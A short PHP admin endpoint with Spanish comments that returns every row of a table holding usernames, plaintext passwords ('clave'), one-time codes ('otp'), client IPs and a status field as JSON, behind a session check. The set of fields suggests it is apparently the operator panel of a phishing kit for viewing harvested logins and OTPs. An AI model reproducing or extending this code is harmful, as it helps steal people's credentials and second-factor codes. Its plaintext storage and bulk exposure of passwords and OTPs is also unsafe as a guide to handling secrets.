<?php
session_start();

// Verificar si el administrador ha iniciado sesión
if (!isset($_SESSION['admin_id'])) {
    header("Location: login.php");
    exit();
}

// Incluir el archivo de conexión a la base de datos
include '../config/conexion.php';

// Obtener los datos de los usuarios, incluyendo 'ip_cliente'
$sql = "SELECT id, usuario, estado, otp, fecha_hora, clave, ip_cliente FROM data"; // Asegúrate de incluir 'ip_cliente'
$result = $conn->query($sql);

$data = [];

// Verificar si hay resultados
if ($result->num_rows > 0) {
    // Recorrer los resultados y agregarlos a un array
    while($row = $result->fetch_assoc()) {
        $data[] = $row;
    }
} else {
    // Si no hay resultados, opcionalmente puedes agregar un mensaje
    $data = ['message' => 'No hay datos disponibles.'];
}

// Establecer el tipo de contenido a JSON y devolver los datos
header('Content-Type: application/json');
echo json_encode($data);

$conn->close();
?>
